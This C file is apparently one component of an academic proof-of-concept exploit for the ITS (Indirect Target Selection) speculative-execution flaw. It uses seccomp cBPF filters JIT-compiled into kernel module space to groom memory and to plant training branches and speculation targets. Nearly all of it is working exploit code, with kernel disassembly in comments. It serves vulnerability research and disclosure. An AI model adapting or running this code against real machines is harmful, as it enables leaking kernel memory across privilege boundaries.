/*
 * End-to-end ITS (Indirect Target Selection) exploit via cBPF
 * Friday, March 22th 2024
 *
 * Sander Wiebing - s.j.wiebing@vu.nl
 * Cristiano Giuffrida - giuffrida@cs.vu.nl
 * Vrije Universiteit Amsterdam - Amsterdam, The Netherlands
 *
 */

#define _GNU_SOURCE

#include <linux/filter.h>
#include <linux/seccomp.h>
#include <linux/unistd.h>
#include <stdio.h>
#include <string.h>
#include <sys/prctl.h>
#include <unistd.h>
#include <assert.h>
#include <stddef.h>
#include <sys/types.h>
#include <stdlib.h>
#include <stdint.h>
#include <syscall.h>
#include <pthread.h>

#include "targets.h"
#include "common.h"

#define VICTIM_SYSCALL SYS_mmap // mmap

#define LO_ARG(idx) offsetof(struct seccomp_data, args[(idx)])
#define HI_ARG(idx) offsetof(struct seccomp_data, args[(idx)]) + sizeof(__u32)


#define syscall_nr (offsetof(struct seccomp_data, nr))

struct sock_filter page_size_filter[BPF_MAXINSNS] = {0};

struct sock_fprog page_size_prog = {
    .filter = page_size_filter,
    .len = 0,
};

struct sock_filter train_filter[BPF_MAXINSNS] = {0};

struct sock_fprog train_prog = {
    .filter = train_filter,
    .len = 0,
};

// -- Initialize a cBPF program of 1 page size
void initialize_page_size_filter(){

    int ins_idx = 0;

    // short path: allow all victim syscall (except non-existing 600)
    page_size_filter[ins_idx++] = (struct sock_filter) BPF_STMT(BPF_LD+BPF_W+BPF_ABS, syscall_nr);
    page_size_filter[ins_idx++] = (struct sock_filter) BPF_JUMP(BPF_JMP+BPF_JEQ+BPF_K, 600, 1, 0);
    page_size_filter[ins_idx++] = (struct sock_filter) BPF_STMT(BPF_RET+BPF_K, SECCOMP_RET_ALLOW);

    for (size_t i = 0; i < 440; i++)
    {
        // 9-byte instruction (cmp    rax,0x258; je  +2)
        // 440 * 9 = 3960 + some padding results in 1 page reserved
	    page_size_filter[ins_idx++] = (struct sock_filter) BPF_JUMP(BPF_JMP+BPF_JEQ+BPF_K, 600, 0, 0);
    }

    page_size_filter[ins_idx++] = (struct sock_filter) BPF_STMT(BPF_RET+BPF_K, SECCOMP_RET_ALLOW);

    assert(ins_idx < 4096);

    page_size_prog.filter = page_size_filter;
    page_size_prog.len = ins_idx;

    printf("Total number of BPF instructions for page_size filter: %d\n", page_size_prog.len);

}

// -- BPF instruction for different byte lengths:
// 3 bytes: (struct sock_filter) BPF_STMT(BPF_MISC | BPF_TAX, 0);
// 3 bytes: (struct sock_filter) BPF_STMT(BPF_ST, 0);
// 4 bytes: (struct sock_filter) BPF_STMT(BPF_STX, 0);
// 6 bytes: (struct sock_filter) BPF_STMT(BPF_LDX+BPF_W+BPF_IMM, 0xdeadd0d0);

// 3 bytes: train_filter[ins_idx++] = (struct sock_filter) BPF_STMT(BPF_ALU+BPF_ADD, 0x1);
// 5 bytes: (struct sock_filter) BPF_STMT(BPF_ALU+BPF_ADD, 0xbeef);
// 9 bytes: (struct sock_filter) BPF_JUMP(BPF_JMP+BPF_JEQ+BPF_K, 438, 0, 0);


void insert_training_branch(uint64_t branch_offset, uint64_t target_offset) {

    assert(branch_offset == 0xa4);
    // For this PoC we assume a static target offset of 0xa0

    int n_bytes = 0;
    int ins_idx = 0;
    int iterations;

    // short path: not our victim syscall
    train_filter[ins_idx++] = (struct sock_filter) BPF_STMT(BPF_LD+BPF_W+BPF_ABS, syscall_nr);
    // train_filter[ins_idx++] = (struct sock_filter) BPF_JUMP(BPF_JMP+BPF_JEQ+BPF_K, 122, 2, 0); // SYS_uname
    train_filter[ins_idx++] = (struct sock_filter) BPF_JUMP(BPF_JMP+BPF_JEQ+BPF_K, VICTIM_SYSCALL, 1, 0);
    train_filter[ins_idx++] = (struct sock_filter) BPF_STMT(BPF_RET+BPF_K, SECCOMP_RET_ALLOW);

    // ...
    // We assume a offset of 40 bytes
    // ...
    // 'header' up to here:
    //    0xffffffffc27d301c:  nop    DWORD PTR [rax+rax*1+0x0]
    //    0xffffffffc27d3021:  push   rbp
    //    0xffffffffc27d3022:  mov    rbp,rsp
    //    0xffffffffc27d3025:  push   rbx
    //    0xffffffffc27d3026:  push   r13
    //    0xffffffffc27d3028:  xor    eax,eax
    //    0xffffffffc27d302a:  xor    r13d,r13d
    //    0xffffffffc27d302d:  mov    rbx,rdi
    //    0xffffffffc27d3030:  mov    eax,DWORD PTR [rbx+0x0]
    //    0xffffffffc27d3033:  cmp    rax,0x9
    //    0xffffffffc27d3037:  je     0xffffffffc27d3044
    //    0xffffffffc27d3039:  mov    eax,0x7fff0000
    //    0xffffffffc27d303e:  pop    r13
    //    0xffffffffc27d3040:  pop    rbx
    //    0xffffffffc27d3041:  leave
    //    0xffffffffc27d3042:  ret
    //    0xffffffffc27d3043:  int3
    //    0xffffffffc27d3044:  ...
    // -> is 40 bytes
    n_bytes += 40;

    // We place 33 instructions of 6 bytes. (72 bytes)
    //  160 (=0xa0) - 40 - (33 * 3) = 31.


    iterations = 33;
    // iterations = 0 + (rand() % 50);
    for (size_t i = iterations; i > 0; i--)
    {
        // 3-byte instruction ( mov    r13,rax)
        train_filter[ins_idx++] = (struct sock_filter) BPF_STMT(BPF_MISC | BPF_TAX, 0);
        n_bytes += 3;
    }


    // TRAIN BRANCH:
    // we place the instruction later
    int train_branch_idx = ins_idx++;

    assert(target_offset - branch_offset - 1 == 128);

    // We need to fill the gap of 128 bytes between train branch and target
    // 41 * 3 + 5 == 128
    iterations = 41 ;
    // iterations = 0 + (rand() % 50);
    for (size_t i = iterations; i > 0; i--)
    {
        // 3-byte instruction (mov    r13,rax)
        train_filter[ins_idx++] = (struct sock_filter) BPF_STMT(BPF_MISC | BPF_TAX, 0);
        n_bytes += 3;
    }
    // 5 byte instruction (add    eax,0xbeef)
    train_filter[ins_idx++] = (struct sock_filter) BPF_STMT(BPF_ALU+BPF_ADD, 0xbeef);
    n_bytes += 5;


    int jump_length = ins_idx - train_branch_idx - 1; // static offset: 42
    train_filter[train_branch_idx] = (struct sock_filter) BPF_JUMP(BPF_JMP+BPF_JEQ+BPF_K, VICTIM_SYSCALL, iterations, jump_length);

    // SPECULATION TARGET: (mov    r13d,0xcafebabe)
    train_filter[ins_idx++] = (struct sock_filter) BPF_STMT(BPF_LDX+BPF_W+BPF_IMM, 0xcafebabe);


    // some padding
    for (size_t i = 0; i < 10; i++)
    {
        // 6-byte instruction (mov    r13d,0x10101010)
        train_filter[ins_idx++] = (struct sock_filter) BPF_STMT(BPF_LDX+BPF_W+BPF_IMM, 0x10101010);
        n_bytes += 6;
    }

    train_filter[ins_idx++] = (struct sock_filter) BPF_STMT(BPF_RET+BPF_K, SECCOMP_RET_ALLOW);

    // fill up the page
    for (size_t i = 0; i < 600; i++)
    {
        // 6-byte instruction (mov    r13d,0x20202020)
        train_filter[ins_idx++] = (struct sock_filter) BPF_STMT(BPF_LDX+BPF_W+BPF_IMM, 0x20202020);
        n_bytes += 6;
    }

    train_filter[ins_idx++] = (struct sock_filter) BPF_STMT(BPF_RET+BPF_K, SECCOMP_RET_ALLOW);

    assert(ins_idx < 4096);

    train_prog.filter = train_filter;
    train_prog.len = ins_idx;

    // printf("Total number of BPF instructions for train filter: %d\n", train_prog.len);

    if (prctl(PR_SET_SECCOMP, SECCOMP_MODE_FILTER, &train_prog)) {
        perror("prctl(SECCOMP)");
        exit(1);
    }

}

// Fork and allocate total of 2MB memory in module space
void fork_insert_program_2MB() {


    // we JIT 512 pages in order to reserve 2MB in total
    pid_t p;

    for (size_t i = 0; i < 512 / 64; i++)
    {
        // we create 8 childs, which all will JIT 64 pages
        p = fork();
        if (p < 0) {
            perror("fork fail");
            exit(1);
        } else if (p > 0) {
            usleep(1000 * 100);
            continue;
        } else {
            // child
            break;
        }

    }

     if (p > 0) {
        usleep(1000 * 100);
        // parent returns
        return;
    }

    // pin_to_core(IDLE_CORE);

    for (int i = 0; i < 64; i++) {

        if (prctl(PR_SET_SECCOMP, SECCOMP_MODE_FILTER, &page_size_prog)) {
            perror("prctl(SECCOMP)");
            exit(1);
        }

    }


    while (1)
    {
        sleep(10);
    }

}

// Fork and allocate 4k memory in module space
void fork_insert_program_4K() {

    pid_t p;
    p = fork();
    if (p < 0) {
      perror("fork fail");
      exit(1);
    } else if (p > 0) {
        usleep(1000);
        // parent returns
        return;
    }

    if (prctl(PR_SET_SECCOMP, SECCOMP_MODE_FILTER, &page_size_prog)) {
        perror("prctl(SECCOMP)");
        exit(1);
    }


    while (1)
    {
        sleep(10);
    }

}

// Fork and allocate N pages in module space
void fork_insert_program_n_pages(uint64_t n_pages) {

    assert(n_pages <= 64);

    pid_t p;
    p = fork();
    if (p < 0) {
      perror("fork fail");
      exit(1);
    } else if (p > 0) {
        usleep(1000);
        // parent returns
        return;
    }

    // pin_to_core(IDLE_CORE);

    for (int i = 0; i < n_pages; i++) {

        if (prctl(PR_SET_SECCOMP, SECCOMP_MODE_FILTER, &page_size_prog)) {
            perror("prctl(SECCOMP)");
            exit(1);
        }

    }

    while (1)
    {
        sleep(10);
    }

}

// Fork and allocate N bytes in module space
void fork_reserve_n_bytes(uint64_t bytes) {

    uint64_t n_pages = 0;

    assert(bytes % 4096 == 0);


    while (bytes > (64 * 4096))
    {
        fork_insert_program_n_pages(64);
        bytes -= (64 * 4096);
        n_pages += 64;
    }

    fork_insert_program_n_pages(bytes / 4096);
    n_pages += bytes / 4096;

    printf("[+] Reserved in total %lu pages\n", n_pages);

}

void initialize_cbpf() {

	if (prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0)) {
		perror("prctl(NO_NEW_PRIVS)");
        exit(1);
	}

    initialize_page_size_filter();

}
